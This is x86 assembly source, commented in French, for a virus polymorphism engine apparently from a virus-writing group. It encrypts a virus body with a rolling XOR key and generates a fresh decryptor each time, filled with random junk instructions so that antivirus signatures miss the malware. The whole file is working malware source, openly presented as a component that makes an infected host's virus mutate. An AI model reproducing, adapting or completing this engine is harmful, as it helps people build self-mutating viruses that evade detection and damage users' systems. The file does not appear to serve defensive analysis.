; Androgyne's Polymorphism Engine
; by Androgyne/RtC
;
;
; <<<< Polymorphism >>>> : routine principale (c'est elle qui coordonne tout)
;  entrée:
;     ds:si = source du code à encoder
;     es:di = adresse de l'espace de travail
;     cx    = taille du code à encoder
;     bx    = offset du début du virus dans le nouvel hôte
;  sortie:
;     aucune

Polymorphism:
    push ax                                 ;
    push bx                                 ;
    push cx                                 ;
    push dx                                 ;on push tous les registres
    call Initialize                         ;initialisation de tous les paramètres
    mov cx,[bp + decrypt_size]              ;c'est le même bp que pour le corps du virus
    call Gen_decrypt_routine                ;on génère la routine de déchiffrement
    call Encrypt_code                       ;on chiffre le corps du virus
    pop dx                                  ;
    pop cx                                  ;
    pop bx                                  ;
    pop ax                                  ;on pop tout les registres
    ret                                     ;


; <<<< Initialize >>>> : Initialisation des paramètres
;  entrée:
;     cx = taille du code à encoder/décoder
;     bx = adresse du début de la partie cryptée du virus dans le nouvel hôte
;  sortie:
;     les buffers suivants sont mis à jour
;       -key1 : contient la clé de codage primaire
;       -key2 : contient la clé de codage secondaire
;       -size : contient la taille du virus
;       -decrypt_size : contient la taille de la routine de décryptage
;       -start_add :contient l'adresse de début du décryptage (pour initialiser si et di)
;     ainsi que les zones de fabrication de la routine de décryptage correspondante

Initialize:
    mov ax,0FFFFh
    call Get_random                         ;on tire un nombre au hasard entre 0 et FFFE
    mov byte ptr [bp + key1],al             ;la clé primaire (buffer)
    mov byte ptr [bp + key2],ah             ;la clé secondaire (buffer)
    mov word ptr [bp + virus_size],cx       ;la taille (buffer)
    push ax                                 ;on se le met au frais
    mov ax,0040h                            ;on veut que la taille de la
    call Get_random                         ;routine de déchiffrement soit comprise
    add ax,0060h                            ;entre 40h et 100h octets
    mov word ptr [bp + decrypt_size],ax     ;on conserve le résultat

    add bx,ax                               ;offset du début de partie chiffrée dans bx
    dec bx                                  ;on est obligé, je ne sais pas d'où ça vient
    mov word ptr [bp + start_add],bx        ;l'adresse de départ (buffer)
    pop ax                                  ;on récupère ax

    mov byte ptr [bp + key1@],al            ;la clé primaire (décryptage)
    mov byte ptr [bp + key2@],ah            ;la clé secondaire (décryptage)
    mov word ptr [bp + virus_size@],cx      ;la taille (décryptage)
    mov word ptr [bp + start_add1@],bx      ;l'adresse de départ si (décryptage)
    mov word ptr [bp + start_add2@],bx      ;l'adresse de départ di (décryptage)

    ret

key1         db 0                           ;tous ces buffers sont actualisé avec 
key2         db 0                           ;la routine Initialize
virus_size   dw 0
decrypt_size dw 0
start_add    dw 0


; <<<< Encrypt_code >>>> : Chiffrement du corps du virus
;  entrée:
;     ds:si = source du code à encoder
;     es:di = adresse de l'espace de travail
;  sortie:
;     aucune

Encrypt_code:
    mov cx,[bp + virus_size]                ;cx contient la taille du code
    mov dl,[bp + key1]                      ;dl contient la clé primaire
    mov dh,[bp + key2]                      ;dh contient la clé secondaire
    Crypt_loop:
    lodsb                                   ;le chiffrement est basé sur une clé xor
    xor al,dl                               ;que l'on met dans dl
    add dl,dh                               ;et que l'on incrémente de dh à chaque fois
    stosb                                   ;on déchiffre de la même manière
    loop Crypt_loop
    ret


; <<<< Gen_decrypt_routine >>>> : générateur de la routine de déchiffrement
;  entrée:
;     cx    = nombre d'octets disponibles total
;     es:di = destination du code de la routine
;  sortie:
;     aucune

Gen_decrypt_routine:
    sub cx,22                               ;nombre d'octets de la routine elle même
    mov word ptr [bp + Bytes_left],cx       ;Bytes_left est le nombre d'octets restants
    mov cx,0Ah                              ;
    call Gen_code                           ;on génère un peu de code

; "mov cx,size" = [B9****]
    mov al,0B9h                             ;
    stosb                                   ;
    virus_size@ equ $+1                     ;virus_size@ pointe sur le 0 l'instruction
    mov ax,0                                ;qui est ici. Ce n'est plus 0 quand on
    stosw                                   ;arrive (voir Initialize)

    mov cx,09h
    call Gen_code                           ;encore un peu de code
    
; "mov si,start_add" = [BE****]
    mov al,0BEh                             ;
    stosb                                   ;
    start_add1@ equ $+1                     ;même chose qu'avant
    mov ax,0                                ;
    stosw                                   ;

    mov cx,08h                              ;
    call Gen_code                           ;et un peu de code pour la route

; "mov di,start_add" = [BF****]
    mov al,0BFh                             ;
    stosb                                   ;
    start_add2@ equ $+1                     ;je ne vais pas me répéter
    mov ax,0                                ;
    stosw                                   ;

    mov cx,07h                              ;
    call Gen_code                           ;du code, du code !

; "mov dl,key1" = [B2**]
    mov al,0B2h                             ;
    stosb                                   ;
    key1@ equ $+1                           ;ça ne s'explique même plus
    mov al,0                                ;
    stosb                                   ;

    mov cx,06h                              ;
    call Gen_code                           ;encore du code

; "mov dh,key2" = [B6**]
    mov al,0B6h                             ;
    stosb                                   ;
    key2@ equ $+1                           ; :-o
    mov al,0                                ;
    stosb                                   ;

    mov cx,05h                              ;
    call Gen_code                           ;re-re-re-re-code

;Decrypt_loop:
    push di                                 ;là, c'est important, on conserve l'adresse
                                            ;pour le loop


; "lodsb" = [AC]
    mov al,0ACh                             ;on attaque la partie routine de
    stosb                                   ;déchiffrement à proprement parler

    mov cx,08h                              ;
    call Gen_code                           ;on met moins de code à cause du loop

; "xor al,dl" = [32C2]
    mov al,32h                              ;
    stosb                                   ;
    mov al,0C2h                             ;
    stosb                                   ;

    mov cx,08h                              ;
    call Gen_code                           ;id

; "add dl,dh" = [02D6]
    mov al,02h                              ;
    stosb                                   ;
    mov al,0D6h                             ;
    stosb                                   ;

    mov cx,03h                              ;
    call Gen_code                           ;id

; "stosb" = [AA]
    mov al,0AAh                             ;
    stosb                                   ;

    mov cx,03h                              ;
    call Gen_code                           ;id

; "loop Decrypt_loop" [E2**]
    mov al,0E2h                             ;
    stosb                                   ;
    pop cx                                  ;on reprend l'adresse qu'on a empilé
    sub cx,di                               ;on elève l'adresse actuelle
    sub cx,01h                              ;normalement c'est 02, allez comprendre...
    mov al,cl                               ;
    stosb                                   ;on l'écrit

    mov cx,00h                              ;
    call Gen_code                           ;on finit par remplir par du code

    ret

Bytes_left dw 0                             ;il est là le buffer Bytes_left


; <<<< Gen_code >>>> : Générateur de code aléatoire
; entrée:
;    es:di = adresse de l'espace de travail
;    cx    = nombres d'appels restants
; sortie:
;    aucune

Gen_Code:
    push ax                                 ;
    push bx                                 ;
    push cx                                 ;
    push dx                                 ;on pushe tout

    or cx,cx                                ;si cx=0
    jz Use_all                              ;on utilise toute la place restante
    mov ax,[bp + Bytes_left]                ;sinon, on calcule combien on doit
    xor dx,dx                               ;mettre de code en moyenne. S'il reste 100
    div cx                                  ;octets et 10 appels, on met 10 octets en
    call Get_random                         ;moyenne à chaque fois.
    mov cx,ax                               ;
    sub word ptr [bp + Bytes_left],cx       ;on enlève les octets que l'on va générer
    jmp Gen_label                           ;

  Use_all:                                  ;
    mov cx,[Bytes_left + bp]                ;on prend tout ce qu'il reste
    sub word ptr [bp + Bytes_left],cx       ;on met zéro dans Bytes_left

  Gen_label:                                ;
    cmp cx,2                                ;s'il reste deux octets, on se restreint à
    mov ax,4                                ;des instructions codées sur 2 octets
    jz Rand_instr                           ;
    cmp cx,1                                ;s'il reste un octet,
    jz Wri_final_nop                        ;on écrit un nop
    cmp cx,0                                ;s'il n'en reste aucun
    jz Next0                                ;on sort de la boucle
    mov ax,9                                ;sinon, on choisit parmi les 9 possibilités
  Rand_instr:
    call Get_Random                         ;tout est déterminé au hasard
    mov bx,offset Instr_Add                 ;c'est là qu'il y a une feinte pratique
    add bx,ax                               ;un offset est codé en deux octets
    add bx,ax                               ;
    add bx,bp                               ;on n'oublie pas le décalage
    call cs:[bx]                            ;magie, magie, on saute...
    jmp Gen_label                           ;fin de la boucle, retour au début

  Next0:                                    ;
    pop dx                                  ;
    pop bx                                  ;
    pop cx                                  ;
    pop ax                                  ;on pop tout avant de repartir
    ret


Instr_Add dw offset Wri_pp                  ;je pense qu'il n'y a pas besoin
          dw offset Wri_mov                 ;de donner des explications,
          dw offset Wri_nop                 ;il y a ici toutes les adresses
          dw offset Wri_xchg                ;des instructions que l'on peut générer,
          dw offset Wri_or1                 ;ces instructions ne modifie aucun
          dw offset Wri_and1                ;registre (c'est plus facile mais moins
          dw offset Wri_or2                 ;performant).
          dw offset Wri_and2
          dw offset Wri_cmp


Get_Reg:
    mov ax,8                                ;petite routine qui permet d'éviter de
    call Get_Random                         ;répéter 46 fois la même chose
    ret

Wri_final_nop:
    call Wri_nop                            ;c'est pour le nop de fin, on est obligé de
    jmp Next0                               ;faire comme ça parce qu'on a pas de call

Wri_pp:                                     ;écrit la paire "push r/pop r"
    call Get_Reg                            ;qui se code [50h+r][58h+r]
    push ax                                 ;
    add al,50h                              ;
    stosb                                   ;
    dec cx                                  ;
    pop ax                                  ;
    add al,58h                              ;
    stosb                                   ;
    dec cx                                  ;
    ret

Wri_mov:                                    ;écrit un "mov r,r"
    mov al,89h                              ;qui se code [89h][0C0h+9*r]
    stosb                                   ;
    dec cx                                  ;
    call Get_Reg                            ;
    push bx                                 ;
    mov bx,9                                ;
    mul bx                                  ;
    pop bx                                  ;
    add al,0c0h                             ;
    stosb                                   ;
    dec cx                                  ;
    ret

Wri_nop:                                    ;écrit un "nop"
    mov al,90h                              ;qui se code [90h]
    stosb                                   ;
    dec cx                                  ;
    ret                                     ;

Wri_xchg:                                   ;écrit un "xchg r,r"
    mov al,87h                              ;qui se code [87h][0C0h+9*r]
    stosb                                   ;
    dec cx                                  ;
    call Get_Reg                            ;
    push bx                                 ;
    mov bx,9                                ;
    mul bx                                  ;
    pop bx                                  ;
    add al,0c0h                             ;
    stosb                                   ;
    dec cx                                  ;
    ret

Wri_or1:                                    ;écrit un "or r,r"
    mov al,0Bh                              ;qui se code [0Bh][0C0h+9*r]
    stosb                                   ;
    dec cx                                  ;
    call Get_Reg                            ;
    push bx                                 ;
    mov bx,9                                ;
    mul bx                                  ;
    pop bx                                  ;
    add al,0c0h                             ;
    stosb                                   ;
    dec cx                                  ;
    ret
    
Wri_and1:                                   ;écrit un "and r,r"
    mov al,23h                              ;qui se code [23h][0C0h+9*r]
    stosb                                   ;
    dec cx                                  ;
    call Get_Reg                            ;
    push bx                                 ;
    mov bx,9                                ;
    mul bx                                  ;
    pop bx                                  ;
    add al,0c0h                             ;
    stosb                                   ;
    dec cx                                  ;
    ret

Wri_or2:                                    ;écrit un "or r,0"
    mov al,83h                              ;qui se code [83h][0C8h+r][00]
    stosb                                   ;
    dec cx                                  ;
    call Get_Reg                            ;
    add al,0c8h                             ;
    stosb                                   ;
    dec cx                                  ;
    mov al,00h                              ;
    stosb                                   ;
    dec cx                                  ;
    ret

Wri_and2:                                   ;écrit un "and r,0FFFFh"
    mov al,83h                              ;qui se code [83h][0E0h+r][FF]
    stosb                                   ;
    dec cx                                  ;
    call Get_Reg                            ;
    add al,0E0h                             ;
    stosb                                   ;
    dec cx                                  ;
    mov al,0FFh                             ;
    stosb                                   ;
    dec cx                                  ;
    ret

Wri_cmp:                                    ;écrit un "cmp r,?"
    mov al,83h                              ;qui se code [83h][0F8h+r][?]
    stosb                                   ;
    dec cx                                  ;
    call Get_Reg                            ;
    add al,0F8h                             ;
    stosb                                   ;
    dec cx                                  ;
    mov ax,100h                             ;
    call Get_Random                         ;
    stosb                                   ;
    dec cx                                  ;
    ret



; <<<< Get_Random >>>>
; Linear Congruential Pseudo-Random Number Generator
; X(n+1) = (A * X(n) + C) mod M
;
; entrée:
;     ax = nombres de possibilités maxi
; sortie:
;     ax = nombre généré

Get_Random:
    push bx
    push cx
    push dx
    push ax
    mov ax,[bp + Rand_Seed]
    mov cx,A
    mul cx
    add ax,C
    adc dx,0
    mov cx,M
    div cx
    mov ax,dx
    mov [bp + Rand_Seed],ax
    pop cx
    xor dx,dx
    div cx
    mov ax,dx
    pop dx
    pop cx
    pop bx
    ret
        
M equ 43691
A equ 13
C equ 14449
Rand_Seed dw 4040

; <<<< Load_Rand_Seed >>>>
; entrée
;    aucune
; sortie
;    aucune

Load_Rand_Seed:
    push ax
    push dx
    push ds
    push si    

    xor ax,ax
    mov ds,ax
    mov si,46Ch
    lodsw
    xor dx,dx
    mov cx,M
    div cx
    mov word ptr [bp + Rand_Seed],dx

    pop si
    pop ds
    pop dx
    pop ax
    ret